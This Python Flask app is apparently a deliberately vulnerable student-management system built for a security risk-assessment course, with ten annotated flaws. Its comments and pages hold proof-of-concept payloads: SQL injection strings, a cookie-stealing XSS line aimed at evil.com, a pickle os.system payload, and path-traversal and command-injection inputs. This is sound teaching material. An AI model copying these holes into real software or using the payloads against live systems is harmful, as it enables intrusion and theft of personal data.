"""
╔══════════════════════════════════════════════════════════════════════════════╗
║         STUDENT MANAGEMENT SYSTEM — VULNERABLE VERSION (EDUCATIONAL)        ║
║         MITRE ATT&CK Phase-Annotated | ISRM Project Phase 2                ║
║                                                                              ║
║  ⚠️  WARNING: This code contains INTENTIONAL security vulnerabilities.      ║
║      It is designed ONLY for educational/academic risk assessment.           ║
║      DO NOT deploy in any production or real-world environment.              ║
╚══════════════════════════════════════════════════════════════════════════════╝

Vulnerability Inventory (10 Vulnerabilities across 8 MITRE ATT&CK Tactics):

  ID  | Vulnerability                     | MITRE Tactic           | CVSS
 ─────┼────────────────────────────────────┼────────────────────────┼──────
  V01 │ SQL Injection (Login)              │ Initial Access (TA0001)│  9.8
  V02 │ SQL Injection (Search)             │ Collection (TA0009)    │  8.8
  V03 │ Hardcoded Credentials              │ Persistence (TA0003)   │  7.5
  V04 │ Insecure File Upload               │ Execution (TA0002)     │  8.8
  V05 │ OS Command Injection               │ Execution (TA0002)     │  9.8
  V06 │ Path Traversal / XSS              │ Collection (TA0009)    │  7.5
  V07 │ Insecure Deserialization (Pickle)  │ Execution (TA0002)     │  9.8
  V08 │ Privilege Escalation (IDOR)        │ Priv. Esc. (TA0004)   │  8.8
  V09 │ Sensitive Data Exposure (SSN/Pass) │ Exfiltration (TA0010)  │  7.5
  V10 │ Debug Mode + Weak Secret Key       │ Defense Evasion(TA0005)│  5.3
"""

import sqlite3
import os
import pickle
import subprocess
from flask import Flask, request, session, render_template_string, redirect, url_for

app = Flask(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [V03] VULNERABILITY — Hardcoded Credentials & Weak Secret Key
#        MITRE: Persistence (TA0003) | CVSS: 7.5 (High)
#        Impact: Attacker who reads source code gains instant admin access.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.secret_key = "secret123"          # VULN: Weak, hardcoded secret key
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "admin123"           # VULN: Hardcoded admin credentials

DB_PATH = "students.db"
UPLOAD_FOLDER = "/tmp/uploads"


def get_db():
    conn = sqlite3.connect(DB_PATH)
    return conn


def init_db():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT DEFAULT 'student')""")
    cursor.execute("""CREATE TABLE IF NOT EXISTS students (
        id INTEGER PRIMARY KEY, name TEXT, email TEXT, grade TEXT, ssn TEXT)""")
    cursor.execute("""CREATE TABLE IF NOT EXISTS activity_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT, event TEXT, detail TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)""")
    # [V03] Passwords stored in plaintext — no hashing
    cursor.execute("INSERT OR IGNORE INTO users VALUES (1,'admin','admin123','admin')")
    cursor.execute("INSERT OR IGNORE INTO users VALUES (2,'student1','pass123','student')")
    cursor.execute("INSERT OR IGNORE INTO users VALUES (3,'student2','qwerty','student')")
    # [V09] SSNs stored in plaintext
    cursor.execute("INSERT OR IGNORE INTO students VALUES (1,'Alice Smith','alice@example.com','A','123-45-6789')")
    cursor.execute("INSERT OR IGNORE INTO students VALUES (2,'Bob Jones','bob@example.com','B','987-65-4321')")
    cursor.execute("INSERT OR IGNORE INTO students VALUES (3,'Carol White','carol@example.com','A+','555-12-3456')")
    conn.commit()
    conn.close()


# ═══════════════════════════════════════════════════════════════════════════
# ROUTE: LOGIN
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/', methods=['GET', 'POST'])
def login():
    """
    [V01] SQL INJECTION — Login Bypass
    MITRE Tactic : Initial Access (TA0001) — T1190: Exploit Public-Facing App
    CVSS Score   : 9.8 (Critical)
    PoC Payload  : Username = admin'-- (bypasses password check entirely)
    Impact       : Unauthenticated admin access, full data breach.
    """
    error = ""
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        conn = get_db()
        cursor = conn.cursor()

        # [V01] RAW SQL — no parameterization
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        print(f"[DEBUG] Executing query: {query}")   # [V10] Sensitive SQL logged to stdout
        cursor.execute(query)
        user = cursor.fetchone()
        conn.close()

        if user:
            session['user_id'] = user[0]
            session['username'] = user[1]
            session['role'] = user[3]
            # [V10] No session expiry or regeneration after login
            return redirect(url_for('dashboard'))
        else:
            error = "Invalid credentials"

    return render_template_string(LOGIN_HTML, error=error)


# ═══════════════════════════════════════════════════════════════════════════
# ROUTE: DASHBOARD
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/dashboard')
def dashboard():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template_string(DASHBOARD_HTML,
                                  username=session['username'],
                                  role=session['role'])


# ═══════════════════════════════════════════════════════════════════════════
# ROUTE: STUDENT SEARCH
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/search', methods=['GET', 'POST'])
def search():
    """
    [V02] SQL INJECTION — Search Endpoint
    MITRE Tactic : Collection (TA0009) — T1213: Data from Info Repositories
    CVSS Score   : 8.8 (High)
    PoC Payload  : name = %' UNION SELECT id,username,password,role,'' FROM users--
    Impact       : Dumps entire users table including credentials.
    Also exposes SSNs (V09) since SELECT * returns all columns.
    """
    if 'username' not in session:
        return redirect(url_for('login'))
    results = []
    search_query = ""
    if request.method == 'POST':
        name = request.form.get('name', '')
        search_query = name
        conn = get_db()
        cursor = conn.cursor()
        # [V02] VULNERABLE: Raw f-string SQL
        query = f"SELECT * FROM students WHERE name LIKE '%{name}%'"
        cursor.execute(query)
        results = cursor.fetchall()
        conn.close()
    return render_template_string(SEARCH_HTML, results=results, query=search_query)


# ═══════════════════════════════════════════════════════════════════════════
# ROUTE: FILE UPLOAD
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/upload', methods=['GET', 'POST'])
def upload():
    """
    [V04] INSECURE FILE UPLOAD
    MITRE Tactic : Execution (TA0002) — T1203: Exploitation for Client Execution
    CVSS Score   : 8.8 (High)
    PoC Payload  : Upload shell.php or evil.py with no validation
    Impact       : Remote code execution if server executes uploaded files.
    """
    if 'username' not in session:
        return redirect(url_for('login'))
    msg = ""
    if request.method == 'POST':
        f = request.files.get('file')
        if f:
            os.makedirs(UPLOAD_FOLDER, exist_ok=True)
            # [V04] No extension check, no MIME validation, no size limit
            filepath = os.path.join(UPLOAD_FOLDER, f.filename)   # Also path traversal risk
            f.save(filepath)
            msg = f"✅ File saved to {filepath}"   # [V10] Leaks server path
    return render_template_string(UPLOAD_HTML, msg=msg)


# ═══════════════════════════════════════════════════════════════════════════
# ROUTE: ADMIN COMMAND PANEL
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/admin/run', methods=['GET', 'POST'])
def admin_run():
    """
    [V05] OS COMMAND INJECTION
    MITRE Tactic : Execution (TA0002) — T1059: Command and Scripting Interpreter
    CVSS Score   : 9.8 (Critical)
    PoC Payload  : cmd = ls /etc; cat /etc/passwd
    Impact       : Full OS access, lateral movement, data exfiltration.
    Note: Role check is bypassable via V08 (privilege escalation).
    """
    if session.get('role') != 'admin':
        return render_template_string(ERROR_HTML, msg="⛔ Access Denied — Admin only"), 403
    output = ""
    if request.method == 'POST':
        cmd = request.form.get('cmd', '')
        # [V05] VULNERABLE: Direct shell execution — no sanitization
        output = subprocess.getoutput(cmd)
    return render_template_string(ADMIN_HTML, output=output)


# ═══════════════════════════════════════════════════════════════════════════
# ROUTE: FILE VIEWER
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/files')
def read_file():
    """
    [V06] PATH TRAVERSAL + XSS
    MITRE Tactic : Collection (TA0009) — T1005: Data from Local System
    CVSS Score   : 7.5 (High)
    PoC Payload  : /files?name=../../etc/passwd
    XSS Payload  : /files?name=<script>document.location='http://evil.com?c='+document.cookie</script>
    Impact       : Reads arbitrary server files; steals session cookies.
    """
    if 'username' not in session:
        return redirect(url_for('login'))
    filename = request.args.get('name', 'readme.txt')
    filepath = "/tmp/uploads/" + filename    # [V06] No path sanitization
    try:
        with open(filepath, 'r') as f:
            content = f.read()
    except Exception as e:
        content = str(e)   # [V10] Error message leaks internal paths
    # [V06] XSS: user-controlled content inserted directly into HTML
    return f"<html><head><title>File Viewer</title></head><body><h2>📄 File: {filename}</h2><pre>{content}</pre></body></html>"


# ═══════════════════════════════════════════════════════════════════════════
# ROUTE: LOAD PROFILE (Insecure Deserialization)
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/load_profile', methods=['POST'])
def load_profile():
    """
    [V07] INSECURE DESERIALIZATION — Pickle RCE
    MITRE Tactic : Execution (TA0002) — T1059: Command and Scripting Interpreter
    CVSS Score   : 9.8 (Critical)
    PoC Payload  : Crafted pickle payload that calls os.system() on deserialization
    Impact       : Remote code execution with server's process privileges.

    Example malicious pickle:
        import pickle, os
        class Evil:
            def __reduce__(self):
                return (os.system, ('id > /tmp/pwned',))
        payload = pickle.dumps(Evil())
        requests.post('/load_profile', data=payload)
    """
    # [V07] VULNERABLE: Deserializing untrusted user data with pickle
    data = request.data
    user_obj = pickle.loads(data)    # NEVER do this with untrusted input
    return str(user_obj)


# ═══════════════════════════════════════════════════════════════════════════
# ROUTE: PROMOTE USER (Privilege Escalation / IDOR)
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/promote', methods=['GET'])
def promote():
    """
    [V08] PRIVILEGE ESCALATION — IDOR + Parameter Tampering
    MITRE Tactic : Privilege Escalation (TA0004) — T1548: Abuse Elevation Control
    CVSS Score   : 8.8 (High)
    PoC Payload  : GET /promote?user_id=2&role=admin
    Impact       : Any authenticated user can elevate any account to admin.
    No CSRF protection, no authorization check, no audit log.
    """
    # [V08] No auth check — any user can call this endpoint
    user_id = request.args.get('user_id')
    new_role = request.args.get('role', 'admin')
    conn = get_db()
    cursor = conn.cursor()
    # [V08] SQL injection + parameter tampering
    cursor.execute(f"UPDATE users SET role='{new_role}' WHERE id={user_id}")
    conn.commit()
    conn.close()
    return render_template_string(SUCCESS_HTML, msg=f"User {user_id} promoted to role: <b>{new_role}</b>")


# ═══════════════════════════════════════════════════════════════════════════
# ROUTE: EXPORT DATA (Sensitive Data Exposure)
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/export')
def export_data():
    """
    [V09] SENSITIVE DATA EXPOSURE — No Authorization on Export
    MITRE Tactic : Exfiltration (TA0010) — T1041: Exfiltration Over C2 Channel
    CVSS Score   : 7.5 (High)
    PoC Payload  : GET /export (any logged-in student can access)
    Impact       : Full dump of student SSNs and emails with no role restriction.
    """
    if 'username' not in session:
        return redirect(url_for('login'))
    # [V09] No admin check — any student can export all sensitive data
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM students")   # Returns SSNs in plaintext
    rows = cursor.fetchall()
    conn.close()
    output = "<html><body><h2>📊 Student Export</h2><table border=1>"
    output += "<tr><th>ID</th><th>Name</th><th>Email</th><th>Grade</th><th>SSN</th></tr>"
    for r in rows:
        output += f"<tr><td>{'</td><td>'.join(str(x) for x in r)}</td></tr>"
    output += "</table></body></html>"
    return output


# ═══════════════════════════════════════════════════════════════════════════
# ROUTE: LOGOUT
# ═══════════════════════════════════════════════════════════════════════════
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


# ═══════════════════════════════════════════════════════════════════════════
# HTML TEMPLATES — Professional Dark Theme UI
# ═══════════════════════════════════════════════════════════════════════════

_BASE_STYLE = """
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
  :root {
    --bg: #0f1117; --surface: #1a1d2e; --surface2: #252840;
    --accent: #6c63ff; --accent2: #ff6584; --accent3: #43d9ad;
    --text: #e2e8f0; --muted: #64748b; --border: #2d3048;
    --danger: #ef4444; --warn: #f59e0b; --success: #10b981;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }
  .page-center { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 16px; padding: 40px; width: 100%; max-width: 420px; box-shadow: 0 20px 60px rgba(0,0,0,0.4); }
  .card-wide { max-width: 900px; }
  .logo { display: flex; align-items: center; gap: 12px; margin-bottom: 32px; }
  .logo-icon { width: 44px; height: 44px; background: linear-gradient(135deg, var(--accent), var(--accent2)); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 22px; }
  .logo-text { font-size: 18px; font-weight: 700; color: var(--text); }
  .logo-sub { font-size: 11px; color: var(--muted); letter-spacing: 1px; text-transform: uppercase; }
  h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
  h2 { font-size: 20px; font-weight: 600; margin-bottom: 20px; }
  p.subtitle { color: var(--muted); font-size: 14px; margin-bottom: 28px; }
  .form-group { margin-bottom: 18px; }
  label { display: block; font-size: 13px; color: var(--muted); margin-bottom: 6px; font-weight: 500; }
  input[type=text], input[type=password], input[type=file], textarea, select {
    width: 100%; padding: 12px 16px; background: var(--surface2); border: 1px solid var(--border);
    border-radius: 10px; color: var(--text); font-size: 14px; outline: none; transition: border-color .2s;
  }
  input:focus, textarea:focus { border-color: var(--accent); }
  .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px;
    padding: 12px 24px; border-radius: 10px; font-size: 14px; font-weight: 600;
    cursor: pointer; border: none; transition: all .2s; text-decoration: none; }
  .btn-primary { background: var(--accent); color: #fff; width: 100%; }
  .btn-primary:hover { background: #5a52d5; transform: translateY(-1px); }
  .btn-danger  { background: var(--danger); color: #fff; }
  .btn-success { background: var(--success); color: #fff; }
  .btn-warn    { background: var(--warn); color: #000; }
  .btn-sm { padding: 8px 16px; font-size: 13px; width: auto; }
  .alert { padding: 12px 16px; border-radius: 10px; font-size: 14px; margin-bottom: 16px; }
  .alert-error { background: rgba(239,68,68,.15); border: 1px solid rgba(239,68,68,.3); color: #fca5a5; }
  .alert-success { background: rgba(16,185,129,.15); border: 1px solid rgba(16,185,129,.3); color: #6ee7b7; }
  .alert-warn { background: rgba(245,158,11,.15); border: 1px solid rgba(245,158,11,.3); color: #fcd34d; }
  .vuln-badge { display: inline-block; padding: 3px 8px; border-radius: 6px; font-size: 11px;
    font-weight: 700; letter-spacing: .5px; text-transform: uppercase; }
  .badge-critical { background: rgba(239,68,68,.2); color: #f87171; border: 1px solid rgba(239,68,68,.3); }
  .badge-high { background: rgba(245,158,11,.2); color: #fbbf24; border: 1px solid rgba(245,158,11,.3); }
  .badge-medium { background: rgba(108,99,255,.2); color: #a78bfa; border: 1px solid rgba(108,99,255,.3); }
  nav { background: var(--surface); border-bottom: 1px solid var(--border); padding: 14px 32px;
    display: flex; align-items: center; gap: 16px; }
  nav .nav-brand { font-weight: 700; font-size: 16px; color: var(--accent); margin-right: auto; }
  nav a { color: var(--muted); text-decoration: none; font-size: 14px; padding: 6px 12px;
    border-radius: 8px; transition: all .2s; }
  nav a:hover { background: var(--surface2); color: var(--text); }
  .main { padding: 32px; max-width: 1000px; margin: 0 auto; }
  table { width: 100%; border-collapse: collapse; font-size: 14px; }
  th { background: var(--surface2); padding: 12px 16px; text-align: left; color: var(--muted);
    font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: .5px; }
  td { padding: 12px 16px; border-bottom: 1px solid var(--border); }
  tr:last-child td { border: none; }
  tr:hover td { background: rgba(255,255,255,.02); }
  .table-wrap { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
  .vuln-note { background: rgba(239,68,68,.08); border-left: 3px solid var(--danger);
    padding: 10px 14px; margin: 10px 0; border-radius: 0 8px 8px 0; font-size: 12px; color: #fca5a5; }
  pre { background: var(--surface2); padding: 16px; border-radius: 10px; font-size: 13px;
    white-space: pre-wrap; word-break: break-all; border: 1px solid var(--border); max-height: 300px; overflow-y: auto; }
  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
  .stat-card { background: var(--surface2); border: 1px solid var(--border); border-radius: 12px;
    padding: 20px; text-align: center; }
  .stat-num { font-size: 32px; font-weight: 800; color: var(--accent); }
  .stat-label { font-size: 12px; color: var(--muted); margin-top: 4px; }
  .divider { height: 1px; background: var(--border); margin: 24px 0; }
  .search-box { display: flex; gap: 10px; margin-bottom: 24px; }
  .search-box input { flex: 1; }
  textarea { font-family: 'Courier New', monospace; resize: vertical; min-height: 80px; }
  footer { text-align: center; padding: 16px; color: var(--muted); font-size: 12px; border-top: 1px solid var(--border); margin-top: 40px; }
</style>
"""

LOGIN_HTML = """<!DOCTYPE html><html lang="en"><head><title>Login — SMS</title>""" + _BASE_STYLE + """</head><body>
<div class="page-center">
  <div class="card">
    <div class="logo">
      <div class="logo-icon">🎓</div>
      <div><div class="logo-text">AcademiSMS</div><div class="logo-sub">Student Management System</div></div>
    </div>
    <h1>Welcome back</h1>
    <p class="subtitle">Sign in to access your dashboard</p>
    {% if error %}
    <div class="alert alert-error">⚠️ {{ error }}</div>
    {% endif %}
    <div class="vuln-note">
      <strong>[V01] SQL Injection Active</strong> — Try: <code>admin'--</code> as username
    </div>
    <form method="POST">
      <div class="form-group">
        <label>Username</label>
        <input type="text" name="username" placeholder="Enter username" autocomplete="off">
      </div>
      <div class="form-group">
        <label>Password</label>
        <input type="password" name="password" placeholder="Enter password">
      </div>
      <button class="btn btn-primary" type="submit">Sign In →</button>
    </form>
    <div class="divider"></div>
    <p style="font-size:12px;color:var(--muted);text-align:center">
      ⚠️ EDUCATIONAL USE ONLY — ISRM Project Phase 2
    </p>
  </div>
</div></body></html>"""

DASHBOARD_HTML = """<!DOCTYPE html><html lang="en"><head><title>Dashboard — SMS</title>""" + _BASE_STYLE + """</head><body>
<nav>
  <span class="nav-brand">🎓 AcademiSMS</span>
  <a href="/search">Search</a>
  <a href="/upload">Upload</a>
  <a href="/files?name=readme.txt">Files</a>
  <a href="/export">Export</a>
  {% if role == 'admin' %}<a href="/admin/run">Admin</a>{% endif %}
  <a href="/logout" style="color:var(--danger)">Logout</a>
</nav>
<div class="main">
  <h2>👋 Hello, {{ username }}</h2>
  <p class="subtitle">Role: <strong style="color:var(--accent)">{{ role }}</strong> · System is VULNERABLE (Educational Mode)</p>

  <div class="grid-2" style="grid-template-columns:repeat(4,1fr);margin-bottom:28px">
    <div class="stat-card"><div class="stat-num" style="color:var(--danger)">10</div><div class="stat-label">Vulnerabilities</div></div>
    <div class="stat-card"><div class="stat-num" style="color:#f87171">3</div><div class="stat-label">Critical (9.8)</div></div>
    <div class="stat-card"><div class="stat-num" style="color:#fbbf24">4</div><div class="stat-label">High (7.5–8.8)</div></div>
    <div class="stat-card"><div class="stat-num" style="color:var(--accent)">8</div><div class="stat-label">MITRE Tactics</div></div>
  </div>

  <div class="table-wrap">
    <table>
      <tr><th>#</th><th>Feature</th><th>Vulnerability</th><th>MITRE Tactic</th><th>CVSS</th><th>Action</th></tr>
      <tr><td>1</td><td>Login</td><td><span class="vuln-badge badge-critical">SQL Injection</span></td><td>Initial Access</td><td>9.8</td><td><a href="/" class="btn btn-sm btn-danger">Test →</a></td></tr>
      <tr><td>2</td><td>Search</td><td><span class="vuln-badge badge-high">SQL Injection + Data Exposure</span></td><td>Collection</td><td>8.8</td><td><a href="/search" class="btn btn-sm btn-danger">Test →</a></td></tr>
      <tr><td>3</td><td>File Upload</td><td><span class="vuln-badge badge-high">Unrestricted Upload</span></td><td>Execution</td><td>8.8</td><td><a href="/upload" class="btn btn-sm btn-warn">Test →</a></td></tr>
      <tr><td>4</td><td>File Viewer</td><td><span class="vuln-badge badge-high">Path Traversal + XSS</span></td><td>Collection</td><td>7.5</td><td><a href="/files?name=../../etc/passwd" class="btn btn-sm btn-warn">Test →</a></td></tr>
      <tr><td>5</td><td>Promote</td><td><span class="vuln-badge badge-high">Privilege Escalation (IDOR)</span></td><td>Priv. Escalation</td><td>8.8</td><td><a href="/promote?user_id=2&role=admin" class="btn btn-sm btn-warn">Test →</a></td></tr>
      <tr><td>6</td><td>Export</td><td><span class="vuln-badge badge-high">Sensitive Data Exposure</span></td><td>Exfiltration</td><td>7.5</td><td><a href="/export" class="btn btn-sm btn-warn">Test →</a></td></tr>
      <tr><td>7</td><td>Deserialize</td><td><span class="vuln-badge badge-critical">Pickle RCE</span></td><td>Execution</td><td>9.8</td><td><span class="vuln-badge badge-medium">POST /load_profile</span></td></tr>
      {% if role == 'admin' %}
      <tr><td>8</td><td>Admin Panel</td><td><span class="vuln-badge badge-critical">Command Injection</span></td><td>Execution</td><td>9.8</td><td><a href="/admin/run" class="btn btn-sm btn-danger">Test →</a></td></tr>
      {% endif %}
    </table>
  </div>
</div>
<footer>⚠️ AcademiSMS Vulnerable Version · ISRM Educational Project · DO NOT DEPLOY IN PRODUCTION</footer>
</body></html>"""

SEARCH_HTML = """<!DOCTYPE html><html lang="en"><head><title>Search — SMS</title>""" + _BASE_STYLE + """</head><body>
<nav>
  <span class="nav-brand">🎓 AcademiSMS</span>
  <a href="/dashboard">Dashboard</a>
  <a href="/logout" style="color:var(--danger)">Logout</a>
</nav>
<div class="main">
  <h2>🔍 Search Students</h2>
  <div class="vuln-note">
    <strong>[V02] SQL Injection</strong> — Try: <code>%' UNION SELECT id,username,password,role,'' FROM users--</code>
  </div>
  <div class="search-box">
    <form method="POST" style="display:flex;gap:10px;flex:1">
      <input type="text" name="name" placeholder="Enter student name..." value="{{ query }}">
      <button class="btn btn-primary btn-sm" type="submit">Search</button>
    </form>
  </div>
  {% if results %}
  <div class="table-wrap">
    <table>
      <tr><th>ID</th><th>Name</th><th>Email</th><th>Grade</th><th style="color:var(--danger)">SSN ⚠️</th></tr>
      {% for r in results %}
      <tr>{% for col in r %}<td>{{ col }}</td>{% endfor %}</tr>
      {% endfor %}
    </table>
  </div>
  {% endif %}
</div></body></html>"""

UPLOAD_HTML = """<!DOCTYPE html><html lang="en"><head><title>Upload — SMS</title>""" + _BASE_STYLE + """</head><body>
<nav>
  <span class="nav-brand">🎓 AcademiSMS</span>
  <a href="/dashboard">Dashboard</a>
  <a href="/logout" style="color:var(--danger)">Logout</a>
</nav>
<div class="main">
  <h2>📤 File Upload</h2>
  <div class="vuln-note">
    <strong>[V04] Unrestricted Upload</strong> — No extension/MIME validation. Upload any file including scripts.
  </div>
  {% if msg %}<div class="alert alert-warn">{{ msg }}</div>{% endif %}
  <div class="card" style="max-width:500px">
    <form method="POST" enctype="multipart/form-data">
      <div class="form-group">
        <label>Select File (any type accepted — vulnerability)</label>
        <input type="file" name="file">
      </div>
      <button class="btn btn-primary" type="submit">Upload File</button>
    </form>
  </div>
</div></body></html>"""

ADMIN_HTML = """<!DOCTYPE html><html lang="en"><head><title>Admin Panel — SMS</title>""" + _BASE_STYLE + """</head><body>
<nav>
  <span class="nav-brand">🎓 AcademiSMS</span>
  <a href="/dashboard">Dashboard</a>
  <a href="/logout" style="color:var(--danger)">Logout</a>
</nav>
<div class="main">
  <h2>⚙️ Admin Command Panel</h2>
  <div class="vuln-note">
    <strong>[V05] OS Command Injection</strong> — Input passed directly to <code>subprocess.getoutput()</code>. Try: <code>ls /etc; cat /etc/passwd</code>
  </div>
  <div class="card" style="max-width:600px">
    <form method="POST">
      <div class="form-group">
        <label>System Command</label>
        <input type="text" name="cmd" placeholder="e.g. ls, whoami, cat /etc/passwd">
      </div>
      <button class="btn btn-danger" type="submit">⚡ Execute</button>
    </form>
    {% if output %}
    <div style="margin-top:20px">
      <label>Output:</label>
      <pre>{{ output }}</pre>
    </div>
    {% endif %}
  </div>
</div></body></html>"""

ERROR_HTML = """<!DOCTYPE html><html lang="en"><head><title>Error</title>""" + _BASE_STYLE + """</head><body>
<div class="page-center"><div class="card">
  <h2 style="color:var(--danger)">⛔ {{ msg }}</h2>
  <a href="/dashboard" class="btn btn-primary" style="margin-top:20px">← Back</a>
</div></div></body></html>"""

SUCCESS_HTML = """<!DOCTYPE html><html lang="en"><head><title>Success</title>""" + _BASE_STYLE + """</head><body>
<div class="page-center"><div class="card">
  <div class="alert alert-warn">⚠️ {{ msg }}</div>
  <a href="/dashboard" class="btn btn-primary" style="margin-top:20px">← Dashboard</a>
</div></div></body></html>"""


if __name__ == '__main__':
    init_db()
    # [V10] VULNERABILITY: Debug mode exposes stack traces, interactive debugger, and PIN bypass
    app.run(debug=True, host='0.0.0.0', port=5000)
